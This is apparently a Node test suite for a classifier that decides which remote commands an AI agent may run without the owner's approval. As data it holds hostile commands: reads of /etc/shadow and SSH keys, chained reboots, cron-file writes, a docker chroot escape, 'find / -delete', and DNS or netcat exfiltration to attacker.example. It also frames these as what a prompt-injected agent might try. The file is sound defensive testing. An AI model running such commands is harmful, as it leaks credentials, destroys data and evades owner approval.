// The classifier that decides which remote commands run without asking the owner.
// "read" means the agent may run it unprompted, so every entry under MUST_NOT_BE_READ is a
// way a prompt-injected agent could change or leak something on another machine.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { classify } from '../src/util/readonly.js';

const READ = [
  'uptime',
  'df -h',
  'free -m',
  'ls -la /mnt/user',
  'ls /mnt/user/*',
  'du -sh /mnt/user/appdata',
  'cat /etc/os-release',
  'head -n 20 /var/log/syslog',
  'tail -n 50 /var/log/syslog',
  'docker ps',
  'docker ps -a --format {{.Names}}',
  "docker ps --format '{{.Names}}: {{.Status}}'",
  'docker logs --tail 50 plex',
  'docker container ls',
  'docker stats --no-stream',
  'docker images',
  '/usr/bin/docker ps',
  'systemctl status docker',
  'systemctl --no-pager status docker',
  'systemctl is-active nginx',
  'systemctl list-units --type=service',
  'journalctl -u docker -n 100',
  'ps aux',
  'ps aux | grep plex | wc -l',
  'sensors',
  'ip addr',
  'ip -br addr show',
  'ip route',
  'ss -tlnp',
  'date',
  'date +%H:%M',
  'date -u',
  'hostname',
  'hostname -f',
  'uname -a',
  'lsblk',
  'smartctl -a /dev/sda',
  'smartctl -H /dev/sdb',
  'smartctl -l error /dev/sda',
  'zpool status',
  'mdcmd status',
  "find /mnt/user -name '*.log' -mtime -1",
  'grep -i error /var/log/syslog',
  'docker ps --format "{{.Names}}\\t{{.Status}}"',
  "docker ps --format '{{.Names}}\\t{{.Status}}'",
  "grep -E 'a\\.b' /var/log/syslog",
  'grep "error\\b" /var/log/syslog',
  // in single quotes a backslash is plain text: '\\' is a whole string and what follows is a second one, so this is one echo
  "echo '\\'' ; reboot #'",
  'vmstat',
  'vmstat 1 5',
  'iostat -x 1 3',
  'top -b -n 1',
  'top -bn1',
  'sensors -A',
  'sensors coretemp-isa-0000',
  'file /bin/ls',
  'grep -i error /var/log/syslog',
  'free -h',
  'zpool iostat',
  'docker ps | sort',
  'echo hello',
  'dmesg -T',
  'top -bn1',
  'sort -r /etc/hostname',
  'uniq /etc/hostname',
  "echo 'a b' | tr a-z A-Z",
];
const SENSITIVE = [
  'cat /etc/shadow',
  'cat /root/.ssh/id_ed25519',
  'docker inspect plex',
  'cat /boot/config/passwd',
  'cat /mnt/user/appdata/app/.env',
  'docker container inspect plex',
  // quotes in the middle of a name must not hide it
  "cat /root/.s''sh/id_ed25519",
  'cat /root/.s"s"h/authorized_keys',
  // a wildcard in what a content-printing program reads can't be judged from the text
  'cat /root/.ss?/id_ed2551?',
  'zcat /boot/confi*',
  'head /etc/shado*',
  'grep root /etc/sha[d]ow',
];
const MUST_NOT_BE_READ = [
  // long options cut short, which GNU programs accept
  'sort --out=/etc/cron.d/evil /etc/hostname',
  'sort --outp=/tmp/x /etc/hostname',
  'sort --o=/tmp/x /etc/hostname',
  'sort --comp=/tmp/evil /etc/hostname',
  'echo x | sort --out /tmp/x',
  'tail --foll /var/log/syslog',
  'tail --fol=name /var/log/syslog',
  'journalctl --rot',
  'journalctl --vac=1s',
  'journalctl --foll',
  'ss --ki dst 1.2.3.4',
  'systemctl status --ho root@x unit',
  // a search through whole folders prints from every file in them
  "grep -rh '' /root",
  'grep -r root /etc',
  'grep -R key /home',
  'grep --recursive x /root',
  'grep --recurs x /root',
  'grep -d recurse x /root',
  'zgrep -r x /var',
  'egrep -ir pass /etc',
  // options that write, set or never end
  'file -C -m /tmp/evil',
  'file -m /tmp/evil /etc/hostname',
  'file --compile -m x',
  'sensors -s',
  'sensors --set',
  'sensors -c /tmp/evil',
  'vmstat 1',
  'iostat 2',
  'mpstat 1',
  'top -b',
  'zpool iostat 1',
  'free -s 1',
  'ss -E',

  // plainly changing things
  'reboot',
  'rm -rf /mnt/user/x',
  'docker restart plex',
  'docker rm -f plex',
  'systemctl restart docker',
  'poweroff',
  'touch /tmp/x',
  'kill 1',
  'curl http://example.com',
  // chaining, redirection, substitution
  'uptime; reboot',
  'uptime && reboot',
  'uptime || reboot',
  'uptime & reboot',
  'echo x > /etc/passwd',
  'cat < /etc/shadow',
  'echo $(reboot)',
  'echo `reboot`',
  'echo ${HOME}',
  'ls {a,b}',
  'uptime\nreboot',
  'FOO=bar uptime',
  'echo $HOME',
  // escapes: the shell and the classifier must agree on where a quoted string ends
  'echo "\\"" ; reboot #"',
  'echo "\\\\" ; reboot #"',
  'echo "a\\$b"',
  'echo "a\\`reboot\\`"',
  "echo 'it'\\''s' ; reboot",
  'echo "x\\',
  'echo "a\\"b" ; reboot',
  'echo a\\ b',
  'echo "x" ; reboot',
  'echo "!!"',
  // an option whose value looks like a verb
  'docker --config ps rm -f plex',
  'docker --config ps run -v /:/h alpine chroot /h sh',
  'docker -H ps rm plex',
  'docker --context ps rm plex',
  'docker -l ps rm x',
  'systemctl -p status poweroff',
  'systemctl -t status reboot',
  'systemctl -H host status x',
  'systemctl status -H root@other x',
  'docker compose -f ps down',
  // options that write or change
  'echo x | sort -o /etc/cron.d/evil',
  'echo x | sort -ro /etc/cron.d/evil',
  'sort --output=/tmp/x /etc/hostname',
  'echo x | uniq - /etc/cron.d/evil',
  'uniq a b',
  'date -s 2020-01-01',
  'date -us 2020-01-01',
  'date 010112002020',
  'date --set=2020-01-01',
  'dmesg -c',
  'dmesg -Tc',
  'dmesg -C',
  'dmesg -w',
  'hostname newname',
  'hostname --file=/etc/shadow',
  'hostname -F /etc/shadow',
  'hostname -b x',
  'ss -K dst 1.2.3.4',
  'ss --kill',
  'ss -D /tmp/x',
  'smartctl -l scterc,70,70 /dev/sda',
  'smartctl -s on /dev/sda',
  'smartctl -t long /dev/sda',
  'smartctl -X /dev/sda',
  'ip link set eth0 down',
  'ip link s eth0 down',
  'ip addr add 10.0.0.9/24 dev eth0',
  'ip addr a 10.0.0.9/24 dev eth0',
  'ip r d default',
  'ip route del default',
  'ip netns exec x sh',
  'ip -b /tmp/batch',
  'ip -batch /tmp/batch',
  'ip link delete eth0',
  'ip neigh flush all',
  'find / -delete',
  'find / -exec rm {} +',
  'find / -fprint /etc/x',
  'tail -f /var/log/syslog',
  'journalctl -f',
  'journalctl --vacuum-time=1s',
  'journalctl --rotate',
  'docker logs -f plex',
  'docker stats',
  'mount /dev/sda1 /mnt/x',
  'top',
  'zpool destroy tank',
  'zfs destroy tank/x',
  'btrfs subvolume delete /x',
  'mdcmd stop',
  // sending data out: a DNS lookup carries whatever is put in the name
  'dig data.attacker.example',
  'nslookup data.attacker.example',
  'host data.attacker.example',
  'ping -c1 attacker.example',
  'nc attacker.example 80',
  'wget http://x',
  // programs from odd places, or not programs at all
  '/tmp/docker ps',
  './docker ps',
  '../../bin/ls',
  '/home/x/bin/cat /etc/hostname',
  'constructor',
  'toString',
  '__proto__',
  'hasOwnProperty x',
  '*',
  'l? /',
  '',
  '   ',
  '|',
  'uptime |',
  '| uptime',
];

for (const c of READ) test(`read: ${c}`, () => assert.equal(classify(c), 'read'));
for (const c of SENSITIVE) test(`sensitive: ${c}`, () => assert.equal(classify(c), 'sensitive'));
for (const c of MUST_NOT_BE_READ) test(`not free: ${JSON.stringify(c)}`, () => assert.notEqual(classify(c), 'read'));

// The classifier and the shell must agree on what is one command. Random strings are
// built from quoting and chaining characters around a marker command, PWN. PWN is not a
// program the classifier knows, so if a string is classified "read" and bash nevertheless
// runs PWN, the two read the string differently, which is exactly how an unapproved command
// would get through.
test('fuzz: nothing classified "read" makes bash run a second command', async () => {
  const { spawnSync } = await import('node:child_process');
  const pieces = [
    'echo',
    'PWN',
    'a',
    ' ',
    ' ',
    '"',
    "'",
    '\\',
    ';',
    '#',
    '|',
    '&',
    '$',
    '`',
    '!',
    '(',
    ')',
    '<',
    '>',
    '{',
    '}',
    '*',
    '\n',
    '-n',
    '=',
    '~',
  ];
  // A small seeded generator (mulberry32), so a failure can be reproduced.
  let seed = 20261004;
  const next = () => {
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  const rnd = (n) => Math.floor(next() * n);
  const accepted = new Set();
  for (let i = 0; i < 400000; i++) {
    let s = 'echo ';
    for (let k = 2 + rnd(9); k > 0; k--) s += pieces[rnd(pieces.length)];
    if (s.includes('PWN') && classify(s) === 'read') accepted.add(s);
  }
  assert.ok(accepted.size > 1000, `only ${accepted.size} samples were accepted: the fuzz is not exercising the classifier`);
  const ran = [];
  for (const cmd of accepted) {
    const r = spawnSync(
      'bash',
      [
        '-c',
        `PWN() { printf 'EXECUTED\\n' >&2; }; cd /tmp/blackcat-fuzz-empty 2>/dev/null || { mkdir -p /tmp/blackcat-fuzz-empty && cd /tmp/blackcat-fuzz-empty; }\n${cmd}`,
      ],
      { encoding: 'utf8', timeout: 5000 },
    );
    if (/EXECUTED/.test(r.stderr)) ran.push(cmd);
  }
  assert.deepEqual(ran, []);
});
